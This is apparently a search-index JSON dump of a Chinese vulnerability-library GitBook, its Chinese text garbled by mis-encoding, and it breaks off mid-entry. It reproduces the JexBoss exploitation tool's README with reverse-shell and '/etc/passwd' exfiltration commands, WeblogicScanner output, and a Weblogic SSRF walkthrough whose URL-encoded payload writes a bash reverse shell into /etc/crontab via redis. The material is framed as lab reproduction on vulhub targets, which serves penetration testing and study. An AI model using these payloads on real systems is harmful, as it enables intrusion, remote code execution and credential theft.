{"./":{"url":"./","title":"Introduction","keywords":"","body":"Á®ªËçâ‰∫∫ÂÆâÂÖ®Âõ¢Èòü ÊºèÊ¥ûÊñáÂ∫ì Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:26:47 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/","title":"WebÊúçÂä°Âô®ÊºèÊ¥û","keywords":"","body":"WebÊúçÂä°Âô®ÊºèÊ¥ûü¶î Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Jboss/":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Jboss/","title":"Jboss","keywords":"","body":"Jboss Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Jboss/Scan/":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Jboss/Scan/","title":"Êâ´ÊèèÂ∑•ÂÖ∑","keywords":"","body":"Êâ´ÊèèÂ∑•ÂÖ∑ Jexboss Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Jboss/Scan/Êâ´ÊèèÂ∑•ÂÖ∑ Jexboss.html":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Jboss/Scan/Êâ´ÊèèÂ∑•ÂÖ∑ Jexboss.html","title":"Êâ´ÊèèÂ∑•ÂÖ∑ Jexboss","keywords":"","body":"JexBoss - JBoss (and others Java Deserialization Vulnerabilities) verify and EXploitation Tool JexBoss is a tool for testing and exploiting vulnerabilities in JBoss Application Server and others Java Platforms, Frameworks, Applications, etc. Requirements Python >= 2.7.x urllib3 ipaddress Installation on Linux\\Mac To install the latest version of JexBoss, please use the following commands: git clone https://github.com/joaomatosf/jexboss.git cd jexboss pip install -r requires.txt python jexboss.py -h python jexboss.py -host http://target_host:8080 OR: Download the latest version at: https://github.com/joaomatosf/jexboss/archive/master.zip unzip master.zip cd jexboss-master pip install -r requires.txt python jexboss.py -h python jexboss.py -host http://target_host:8080 If you are using CentOS with Python 2.6, please install Python2.7. Installation example of the Python 2.7 on CentOS using Collections Software scl: yum -y install centos-release-scl yum -y install python27 scl enable python27 bash Installation on Windows If you are using Windows, you can use the Git Bash to run the JexBoss. Follow the steps below: Download and install Python Download and install Git for Windows After installing, run the Git for Windows and type the following commands: PATH=$PATH:C:\\Python27\\ PATH=$PATH:C:\\Python27\\Scripts git clone https://github.com/joaomatosf/jexboss.git cd jexboss pip install -r requires.txt python jexboss.py -h python jexboss.py -host http://target_host:8080 Features The tool and exploits were developed and tested for: JBoss Application Server versions: 3, 4, 5 and 6. Java Deserialization Vulnerabilities in multiple java frameworks, platforms and applications (e.g., Java Server Faces - JSF, Seam Framework, RMI over HTTP, Jenkins CLI RCE (CVE-2015-5317), Remote JMX (CVE-2016-3427, CVE-2016-8735), etc) The exploitation vectors are: /admin-console tested and working in JBoss versions 5 and 6 /jmx-console tested and working in JBoss versions 4, 5 and 6 /web-console/Invoker tested and working in JBoss versions 4, 5 and 6 /invoker/JMXInvokerServlet tested and working in JBoss versions 4, 5 and 6 Application Deserialization tested and working against multiple java applications, platforms, etc, via HTTP POST Parameters Servlet Deserialization tested and working against multiple java applications, platforms, etc, via servlets that process serialized objets (e.g. when you see an \"Invoker\" in a link) Apache Struts2 CVE-2017-5638 tested in Apache Struts 2 applications Others Videos Exploiting Java Deserialization Vulnerabilities (RCE) on JSF/Seam Applications via javax.faces.ViewState with JexBoss Exploiting JBoss Application Server with JexBoss Exploiting Apache Struts2 (RCE) with Jexboss (CVE-2017-5638) Screenshots Simple usage examples: $ python jexboss.py Example of standalone mode against JBoss: $ python jexboss.py -u http://192.168.0.26:8080 Usage modes: $ python jexboss.py -h Network scan mode: $ python jexboss.py -mode auto-scan -network 192.168.0.0/24 -ports 8080 -results results.txt Network scan with auto-exploit mode: $ python jexboss.py -mode auto-scan -A -network 192.168.0.0/24 -ports 8080 -results results.txt Results and recommendations: Reverse Shell (meterpreter integration) After you exploit a JBoss server, you can use the own jexboss command shell or perform a reverse connection using the following command: jexremote=YOUR_IP:YOUR_PORT Example: Shell>jexremote=192.168.0.10:4444 Example: When exploiting java deserialization vulnerabilities (Application Deserialization, Servlet Deserialization), the default options are: make a reverse shell connection or send a commando to execute. Usage examples For Java Deserialization Vulnerabilities in a custom HTTP parameter and to send a custom command to be executed on the exploited server: $ python jexboss.py -u http://vulnerable_java_app/page.jsf --app-unserialize -H parameter_name --cmd 'curl -d@/etc/passwd http://your_server' For Java Deserialization Vulnerabilities in a custom HTTP parameter and to make a reverse shell (this will ask for an IP address and port of your remote host): $ python jexboss.py -u http://vulnerable_java_app/page.jsf --app-unserialize -H parameter_name For Java Deserialization Vulnerabilities in a Servlet (like Invoker): $ python jexboss.py -u http://vulnerable_java_app/path --servlet-unserialize For Apache Struts 2 (CVE-2017-5638) $ python jexboss.py -u http://vulnerable_java_struts2_app/page.action --struts2 For Apache Struts 2 (CVE-2017-5638) with cookies for authenticated resources $ python jexboss.py -u http://vulnerable_java_struts2_app/page.action --struts2 --cookies \"JSESSIONID=24517D9075136F202DCE20E9C89D424D\" Auto scan mode: $ python jexboss.py -mode auto-scan -network 192.168.0.0/24 -ports 8080,80 -results report_auto_scan.log File scan mode: $ python jexboss.py -mode file-scan -file host_list.txt -out report_file_scan.log More Options: optional arguments: -h, --help show this help message and exit --version show program's version number and exit --auto-exploit, -A Send exploit code automatically (USE ONLY IF YOU HAVE PERMISSION!!!) --disable-check-updates, -D Disable two updates checks: 1) Check for updates performed by the webshell in exploited server at http://webshell.jexboss.net/jsp_version.txt and 2) check for updates performed by the jexboss client at http://joaomatosf.com/rnp/releases.txt -mode {standalone,auto-scan,file-scan} Operation mode (DEFAULT: standalone) --app-unserialize, -j Check for java unserialization vulnerabilities in HTTP parameters (eg. javax.faces.ViewState, oldFormData, etc) --servlet-unserialize, -l Check for java unserialization vulnerabilities in Servlets (like Invoker interfaces) --jboss Check only for JBOSS vectors. --jenkins Check only for Jenkins CLI vector. --jmxtomcat Check JMX JmxRemoteLifecycleListener in Tomcat (CVE-2016-8735 and CVE-2016-8735). OBS: Will not be checked by default. --proxy PROXY, -P PROXY Use a http proxy to connect to the target URL (eg. -P http://192.168.0.1:3128) --proxy-cred LOGIN:PASS, -L LOGIN:PASS Proxy authentication credentials (eg -L name:password) --jboss-login LOGIN:PASS, -J LOGIN:PASS JBoss login and password for exploit admin-console in JBoss 5 and JBoss 6 (default: admin:admin) --timeout TIMEOUT Seconds to wait before timeout connection (default 3) Standalone mode: -host HOST, -u HOST Host address to be checked (eg. -u http://192.168.0.10:8080) Advanced Options (USE WHEN EXPLOITING JAVA UNSERIALIZE IN APP LAYER): --reverse-host RHOST:RPORT, -r RHOST:RPORT Remote host address and port for reverse shell when exploiting Java Deserialization Vulnerabilities in application layer (for now, working only against *nix systems)(eg. 192.168.0.10:1331) --cmd CMD, -x CMD Send specific command to run on target (eg. curl -d @/etc/passwd http://your_server) --windows, -w Specifies that the commands are for rWINDOWS System$ (cmd.exe) --post-parameter PARAMETER, -H PARAMETER Specify the parameter to find and inject serialized objects into it. (egs. -H javax.faces.ViewState or -H oldFormData (Questions, problems, suggestions and etc: joaomatosf@gmail.com Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Jboss/JBoss 4.x JBossMQ JMS ÂèçÂ∫èÂàóÂåñÊºèÊ¥û CVE-2017-7504.html":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Jboss/JBoss 4.x JBossMQ JMS ÂèçÂ∫èÂàóÂåñÊºèÊ¥û CVE-2017-7504.html","title":"JBoss 4.x JBossMQ JMS ÂèçÂ∫èÂàóÂåñÊºèÊ¥û CVE-2017-7504","keywords":"","body":"JBoss 4.x JBossMQ JMS ÂèçÂ∫èÂàóÂåñÊºèÊ¥û CVE-2017-7504 ÊºèÊ¥ûÊèèËø∞ Red Hat JBoss Application Server ÊòØ‰∏ÄÊ¨æÂü∫‰∫éJavaEEÁöÑÂºÄÊ∫êÂ∫îÁî®ÊúçÂä°Âô®„ÄÇJBoss AS 4.xÂèä‰πãÂâçÁâàÊú¨‰∏≠ÔºåJbossMQÂÆûÁé∞ËøáÁ®ãÁöÑJMS over HTTP Invocation LayerÁöÑHTTPServerILServlet.javaÊñá‰ª∂Â≠òÂú®ÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÔºåËøúÁ®ãÊîªÂáªËÄÖÂèØÂÄüÂä©ÁâπÂà∂ÁöÑÂ∫èÂàóÂåñÊï∞ÊçÆÂà©Áî®ËØ•ÊºèÊ¥ûÊâßË°å‰ªªÊÑè‰ª£Á†Å„ÄÇ ÂΩ±ÂìçÁâàÊú¨ [!NOTE] JBoss AS 4.xÂèä‰πãÂâçÁâàÊú¨ ÁéØÂ¢ÉÊê≠Âª∫ https://github.com/vulhub/vulhub.git cd vulhub/jboss/CVE-2017-7504 docker-compose build docker-compose up -d ÊºèÊ¥ûÂ§çÁé∞ ËÆøÈóÆÊéßÂà∂Âè∞ ‰ΩøÁî®Â∑•ÂÖ∑ Jexboss ËøõË°åÊºèÊ¥ûÊâ´Êèè python3 jexboss.py -host http://192.168.51.133:8080 ÊàêÂäüÂà©Áî®ÊºèÊ¥ûÊâßË°åÂëΩ‰ª§ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Weblogic/":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Weblogic/","title":"Weblogic","keywords":"","body":"Weblogic Weblogic SSRFÊºèÊ¥û CVE-2014-4210 Weblogic XMLDecoder ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CVE-2017-10271 Weblogic ÂèçÂ∫èÂàóÂåñËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CVE-2019-2725 Weblogic LDAP ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CVE-2021-2109 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Weblogic/Scan/":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Weblogic/Scan/","title":"Êâ´ÊèèÂ∑•ÂÖ∑","keywords":"","body":"Êâ´ÊèèÂ∑•ÂÖ∑ WeblogicScanner Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Weblogic/Scan/Êâ´ÊèèÂ∑•ÂÖ∑ WeblogicScanner.html":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Weblogic/Scan/Êâ´ÊèèÂ∑•ÂÖ∑ WeblogicScanner.html","title":"Êâ´ÊèèÂ∑•ÂÖ∑ WeblogicScanner","keywords":"","body":"WeblogicScanner ÊºèÊ¥ûÊâ´Êèè Ê∫êÂ∑•ÂÖ∑ÈìæÊé•Ôºöhttps://github.com/rabbitmask/WeblogicScan weblogicScaner ÁÆÄ‰Ωì‰∏≠Êñá | English Êà™Ëá≥ 2020 Âπ¥ 11 Êúà 27 Êó•Ôºåweblogic ÊºèÊ¥ûÊâ´ÊèèÂ∑•ÂÖ∑„ÄÇËã•Â≠òÂú®Êú™ËÆ∞ÂΩï‰∏îÂ∑≤ÂÖ¨ÂºÄ POC ÁöÑÊºèÊ¥ûÔºåÊ¨¢ËøéÊèê‰∫§ issue„ÄÇ Âéü‰ΩúËÄÖÂ∑≤ÁªèÊî∂ÈõÜÂæóÊØîËæÉÂÆåÊï¥‰∫ÜÔºåÂú®ËøôÈáåÂÅö‰∫ÜÈÉ®ÂàÜÁöÑ bug ‰øÆÂ§çÔºåÈÉ®ÂàÜËÑöÊú¨ POC Êú™ÁîüÊïàÔºåÈÖçÁΩÆÈîôËØØÁ≠âÈóÆÈ¢ò„ÄÇ‰πãÂâçÊü•‰∫Ü‰∏Ä‰∏ãÂèëÁé∞ÈÉ®ÂàÜ POC Êó†Ê≥ï‰ΩøÁî®„ÄÇÂú®Ëøô‰∏™È°πÁõÆÈáåÈù¢ÂØπËÑöÊú¨ÂÅö‰∫Ü‰∏Ä‰∫õ‰øÆÊîπÔºåÊèêÈ´òÂáÜÁ°ÆÁéá„ÄÇ Ê≥®ÊÑèÔºöÈÉ®ÂàÜÊºèÊ¥ûÁî±‰∫éÁ®≥ÂÆöÊÄßÂéüÂõ†ÈúÄË¶ÅÂ§öÊ¨°ÊµãËØïÊâçÂèØÈ™åËØÅ ÁõÆÂâçÂèØÊ£ÄÊµãÊºèÊ¥ûÁºñÂè∑ÊúâÔºàÈÉ®ÂàÜÈùûÂéüÁêÜÊ£ÄÊµãÔºåÈúÄÊâãÂä®È™åËØÅÔºâÔºö weblogic administrator console CVE-2014-4210 CVE-2016-0638 CVE-2016-3510 CVE-2017-3248 CVE-2017-3506 CVE-2017-10271 CVE-2018-2628 CVE-2018-2893 CVE-2018-2894 CVE-2018-3191 CVE-2018-3245 CVE-2018-3252 CVE-2019-2618 CVE-2019-2725 CVE-2019-2729 CVE-2019-2890 CVE-2020-2551 CVE-2020-14882 CVE-2020-14883 Âø´ÈÄüÂºÄÂßã ‰æùËµñ python >= 3.6 ËøõÂÖ•È°πÁõÆÁõÆÂΩïÔºå‰ΩøÁî®‰ª•‰∏ãÂëΩ‰ª§ÂÆâË£Ö‰æùËµñÂ∫ì $ pip3 install requests ‰ΩøÁî®ËØ¥Êòé usage: ws.py [-h] -t TARGETS [TARGETS ...] -v VULNERABILITY [VULNERABILITY ...] [-o OUTPUT] optional arguments: -h, --help Â∏ÆÂä©‰ø°ÊÅØ -t TARGETS [TARGETS ...], --targets TARGETS [TARGETS ...] Áõ¥Êé•Â°´ÂÖ•ÁõÆÊ†áÊàñÊñá‰ª∂ÂàóË°®ÔºàÈªòËÆ§‰ΩøÁî®Á´ØÂè£7001Ôºâ. ‰æãÂ≠êÔºö 127.0.0.1:7001 -v VULNERABILITY [VULNERABILITY ...], --vulnerability VULNERABILITY [VULNERABILITY ...] ÊºèÊ¥ûÂêçÁß∞ÊàñCVEÁºñÂè∑Ôºå‰æãÂ≠êÔºö\"weblogic administrator console\" -o OUTPUT, --output OUTPUT ËæìÂá∫ json ÁªìÊûúÁöÑË∑ØÂæÑ„ÄÇÈªòËÆ§‰∏çËæìÂá∫ÁªìÊûú -s, --ssl Âº∫Âà∂‰ΩøÁî® https ÂçèËÆÆËØ∑Ê±Ç ÁªìÊûúÊ†∑‰æã (venv) ~/weblogicScanner$ python ws.py -t 192.168.124.129 [23:03:04][INFO] [*][Weblogic Console][192.168.56.129:7001] Start... [23:03:04][INFO] [+][Weblogic Console][192.168.56.129:7001] Found module! [23:03:04][INFO] [*][Weblogic Console][192.168.56.129:7001] Please verify manually! [23:03:04][INFO] [*][CVE-2014-4210][192.168.56.129:7001] Start... [23:03:04][INFO] [-][CVE-2014-4210][192.168.56.129:7001] Not found. [23:03:04][INFO] [*][CVE-2016-0638][192.168.56.129:7001] Start... [23:03:06][INFO] [-][CVE-2016-0638][192.168.56.129:7001] Not vulnerability. [23:03:06][INFO] [*][CVE-2016-3510][192.168.56.129:7001] Start... [23:03:08][INFO] [-][CVE-2016-3510][192.168.56.129:7001] Not vulnerability. [23:03:08][INFO] [*][CVE-2017-3248][192.168.56.129:7001] Start... [23:03:10][INFO] [-][CVE-2017-3248][192.168.56.129:7001] Not vulnerability. [23:03:10][INFO] [*][CVE-2017-3506][192.168.56.129:7001] Start... [23:03:10][INFO] [-][CVE-2017-3506][192.168.56.129:7001] Not vulnerability. [23:03:10][INFO] [*][CVE-2017-10271][192.168.56.129:7001] Start... [23:03:10][INFO] [-][CVE-2017-10271][192.168.56.129:7001] Not vulnerability. [23:03:10][INFO] [*][CVE-2018-2628][192.168.56.129:7001] Start... [23:03:14][INFO] [+][CVE-2018-2628][192.168.56.129:7001] Exists vulnerability! [23:03:14][INFO] [*][CVE-2018-2893][192.168.56.129:7001] Start... [23:03:18][INFO] [+][CVE-2018-2893][192.168.56.129:7001] Exists vulnerability! [23:03:18][INFO] [*][CVE-2018-2894][192.168.56.129:7001] Start... [23:03:19][INFO] [+][CVE-2018-2894][192.168.56.129:7001] Found module! [23:03:19][INFO] [*][CVE-2018-2894][192.168.56.129:7001] Please verify manually! [23:03:19][INFO] [*][CVE-2018-3191][192.168.56.129:7001] Start... [23:03:23][INFO] [+][CVE-2018-3191][192.168.56.129:7001] Exists vulnerability! [23:03:23][INFO] [*][CVE-2018-3245][192.168.56.129:7001] Start... [23:03:29][INFO] [-][CVE-2018-3245][192.168.56.129:7001] Not vulnerability. [23:03:29][INFO] [*][CVE-2018-3252][192.168.56.129:7001] Start... [23:03:36][INFO] [+][CVE-2018-3252][192.168.56.129:7001] Found module! [23:03:36][INFO] [*][CVE-2018-3252][192.168.56.129:7001] Please verify manually! [23:03:36][INFO] [*][CVE-2019-2618][192.168.56.129:7001] Start... [23:03:36][INFO] [+][CVE-2019-2618][192.168.56.129:7001] Found module! [23:03:36][INFO] [*][CVE-2019-2618][192.168.56.129:7001] Please verify manually! [23:03:36][INFO] [*][CVE-2019-2725][192.168.56.129:7001] Start... [23:03:46][INFO] [-][CVE-2019-2725][192.168.56.129:7001] Not vulnerability. [23:03:46][INFO] [*][CVE-2019-2729][192.168.56.129:7001] Start... [23:03:54][INFO] [-][CVE-2019-2729][192.168.56.129:7001] Not vulnerability. [23:03:54][INFO] [*][CVE-2019-2888][192.168.56.129:7001] Start... [23:03:56][INFO] [+][CVE-2019-2888][192.168.56.129:7001] Found module! [23:03:56][INFO] [*][CVE-2019-2888][192.168.56.129:7001] Please verify manually! [23:03:56][INFO] [*][CVE-2019-2890][192.168.56.129:7001] Start... [23:03:58][INFO] [-][CVE-2019-2890][192.168.56.129:7001] Not vulnerability. [23:03:58][INFO] [*][CVE-2020-2551][192.168.56.129:7001] Start... [23:03:58][INFO] [+][CVE-2020-2551][192.168.56.129:7001] Found module! [23:03:58][INFO] [*][CVE-2020-2551][192.168.56.129:7001] Please verify manually! [23:03:58][INFO] [*][CVE-2020-2555][192.168.56.129:7001] Start... [23:04:02][INFO] [+][CVE-2020-2555][192.168.56.129:7001] Exists vulnerability! [23:04:02][INFO] [*][CVE-2020-2883][192.168.56.129:7001] Start... [23:04:06][INFO] [+][CVE-2020-2883][192.168.56.129:7001] Exists vulnerability! [23:04:06][INFO] [*][CVE-2020-14882][192.168.56.129:7001] Start... [23:04:23][INFO] [-][CVE-2020-14882][192.168.56.129:7001] Not vulnerability. [23:04:23][INFO] [*][CVE-2020-14883][192.168.56.129:7001] Start... [23:04:23][INFO] [+][CVE-2020-14883][192.168.56.129:7001] Exists vulnerability! Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Weblogic/Weblogic SSRFÊºèÊ¥û CVE-2014-4210.html":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Weblogic/Weblogic SSRFÊºèÊ¥û CVE-2014-4210.html","title":"Weblogic SSRFÊºèÊ¥û CVE-2014-4210","keywords":"","body":"Weblogic SSRFÊºèÊ¥û CVE-2014-4210 ÊºèÊ¥ûÊèèËø∞ Weblogic‰∏≠Â≠òÂú®‰∏Ä‰∏™SSRFÊºèÊ¥ûÔºåÂà©Áî®ËØ•ÊºèÊ¥ûÂèØ‰ª•ÂèëÈÄÅ‰ªªÊÑèHTTPËØ∑Ê±ÇÔºåËøõËÄåÊîªÂáªÂÜÖÁΩë‰∏≠redis„ÄÅfastcgiÁ≠âËÑÜÂº±ÁªÑ‰ª∂ÔºåÊ≠§ÊºèÊ¥ûÂèØÈÄöËøáHTTPÂçèËÆÆÂà©Áî®ÔºåÊú™ÁªèË∫´‰ªΩÈ™åËØÅÁöÑËøúÁ®ãÊîªÂáªËÄÖÂèØÂà©Áî®Ê≠§ÊºèÊ¥ûÂΩ±ÂìçÂèóÂΩ±ÂìçÁªÑ‰ª∂ÁöÑÊú∫ÂØÜÊÄß ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Oracle WebLogic Server 10.0.2.0 Oracle WebLogic Server 10.3.6.0 ÁéØÂ¢ÉÊê≠Âª∫ git clone https://github.com/vulhub/vulhub.git cd vulhub/weblogic/ssrd docker-compose up -d ËÆøÈóÆ http://xxx.xxx.xxx.xxx:7001 Ê≠£Â∏∏Âç≥ÂèØ ÊºèÊ¥ûÂ§çÁé∞ Âá∫Áé∞ÊºèÊ¥ûÁöÑ URL‰∏∫ : http://xxx.xxx.xxx.xxx:7001/uddiexplorer/SearchPublicRegistries.jsp ‰ΩøÁî® payload ËøõË°åÊé¢Êµã, Â∞ÜÊé¢ÊµãÁöÑ‰ΩçÁΩÆÂÜôÂú® operatorÂèÇÊï∞‰∏≠ [!NOTE] Ê≥®ÊÑèÈúÄË¶ÅÁü•ÈÅìÂÜÖÁΩë IP http://xxx.xxx.xxx.xxx:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://xxx.xxx.xxx.xxx:7001 ÈÄöËøáÊü•ÁúãÊä•ÈîôÂÜÖÂÆπÊù•ËøõË°åÂà§Êñ≠ Â≠òÂú®ÁöÑÊä•ÈîôÂÜÖÂÆπÂ¶ÇÂõæÔºåÂÖ≥ÈîÆÂ≠ó‰∏∫ 404, ‰æãÂ¶ÇÊää operator ÂèÇÊï∞ÊîπÊàê http://xxx.xxx.xxx.xxx:7000 ËøôÊ†∑‰∏çÂ≠òÂú®ÁöÑÂàôÊä•ÈîôÂÜÖÂÆπÂ¶Ç‰∏ãÂõæ ÈÄöËøáËøôÊ†∑ÁöÑÊñπÊ≥ïÂ∞±ÂèØ‰ª•Êé¢ÊµãÂÜÖÁΩëÁöÑÂºÄÊîæÁ´ØÂè£ÊÉÖÂÜµÔºå‰æãÂ¶ÇÂÜÖÁΩë‰∏≠Êúâ‰∏ÄÂè∞‰∏ªÊú∫ IPÔºö172.19.0.2 ÂºÄÂêØ‰∫Ü 6379Á´ØÂè£ÁöÑredisÊúçÂä° Â¶ÇÊûúËÆøÈóÆÁöÑÈùûhttpÂçèËÆÆÔºåÂàô‰ºöËøîÂõûdid not have a valid SOAP content-typeÔºåËøôÊ†∑ÈÄöËøáÈîôËØØÁöÑ‰∏çÂêåÔºåÂç≥ÂèØÊé¢ÊµãÂÜÖÁΩëÁä∂ÊÄÅ„ÄÇ WeblogicÁöÑSSRFÊúâ‰∏Ä‰∏™ÊØîËæÉÂ§ßÁöÑÁâπÁÇπÔºåÂÖ∂ËôΩÁÑ∂ÊòØ‰∏Ä‰∏™‚ÄúGET‚ÄùËØ∑Ê±ÇÔºå‰ΩÜÊòØÊàë‰ª¨ÂèØ‰ª•ÈÄöËøá‰º†ÂÖ•%0a%0dÊù•Ê≥®ÂÖ•Êç¢Ë°åÁ¨¶ÔºåËÄåÊüê‰∫õÊúçÂä°ÔºàÂ¶ÇredisÔºâÊòØÈÄöËøáÊç¢Ë°åÁ¨¶Êù•ÂàÜÈöîÊØèÊù°ÂëΩ‰ª§Ôºå‰πüÂ∞±ËØ¥Êàë‰ª¨ÂèØ‰ª•ÈÄöËøáËØ•SSRFÊîªÂáªÂÜÖÁΩë‰∏≠ÁöÑredisÊúçÂä°Âô®„ÄÇ ÂèëÈÄÅ‰∏âÊù°redisÂëΩ‰ª§ÔºåÂ∞ÜÂºπshellËÑöÊú¨ÂÜôÂÖ•/etc/crontab ‰∏≠Ôºö set 1 \"\\n\\n\\n\\n* * * * * root bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9999 0>&1\\n\\n\\n\\n\" config set dir /etc/ config set dbfilename crontab save Êé•ÁùÄÂÜçÂ∞ÜËØ∑Ê±ÇËøõË°å urlÁºñÁ†Å, [!NOTE] Ê≥®ÊÑèÔºåÊç¢Ë°åÁ¨¶ÊòØ‚Äú\\r\\n‚ÄùÔºå‰πüÂ∞±ÊòØ‚Äú%0D%0A‚Äù test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fxxx.xxx.xxx.xxx%2F9999%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa ÂèëÈÄÅpayload http://xxx.xxx.xxx.xxx:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://172.19.0.2:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.19.0.3%2F9999%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa ÂèëÈÄÅÂêéÁõëÂê¨ 172.19.0.3 9999Á´ØÂè£ Á≠âÂæÖÂèçÂºπshell [!NOTE] ÊúÄÂêéË°•ÂÖÖ‰∏Ä‰∏ãÔºåÂèØËøõË°åÂà©Áî®ÁöÑcronÊúâÂ¶Ç‰∏ãÂá†‰∏™Âú∞ÊñπÔºö /etc/crontab Ëøô‰∏™ÊòØËÇØÂÆöÁöÑ /etc/cron.d/* Â∞Ü‰ªªÊÑèÊñá‰ª∂ÂÜôÂà∞ËØ•ÁõÆÂΩï‰∏ãÔºåÊïàÊûúÂíåcrontabÁõ∏ÂêåÔºåÊ†ºÂºè‰πüË¶ÅÂíå/etc/crontabÁõ∏Âêå„ÄÇÊºèÊ¥ûÂà©Áî®Ëøô‰∏™ÁõÆÂΩïÔºåÂèØ‰ª•ÂÅöÂà∞‰∏çË¶ÜÁõñ‰ªª‰ΩïÂÖ∂‰ªñÊñá‰ª∂ÁöÑÊÉÖÂÜµËøõË°åÂºπshell„ÄÇ /var/spool/cron/root centosÁ≥ªÁªü‰∏ãrootÁî®Êà∑ÁöÑcronÊñá‰ª∂ /var/spool/cron/crontabs/root debianÁ≥ªÁªü‰∏ãrootÁî®Êà∑ÁöÑcronÊñá‰ª∂ ÊºèÊ¥ûÂà©Áî®POC GitHubËÑöÊú¨ CVE-2014-4210+RedisÊú™ÊéàÊùÉËÆøÈóÆ Â≠òÊ¥ªÊâ´Êèè: python SSRFX.py --url http://example.com/uddiexplorer/SearchPublicRegistries.jsp --app weblogic --network 172.16.5.0/24 --type livedetect Á´ØÂè£Êâ´Êèè: python SSRFX.py --url http://example.com/uddiexplorer/SearchPublicRegistries.jsp --app weblogic --network 172.16.5.0/24 --type portscan Goby && POC [!NOTE] Weblogic SSRFÊºèÊ¥û CVE-2014-4210 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Weblogic/Weblogic XMLDecoder ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CVE-2017-10271.html":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Weblogic/Weblogic XMLDecoder ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CVE-2017-10271.html","title":"Weblogic XMLDecoder ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CVE-2017-10271","keywords":"","body":"Weblogic XMLDecoder ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CVE-2017-10271 ÊºèÊ¥ûÊèèËø∞ WeblogicÁöÑWLS 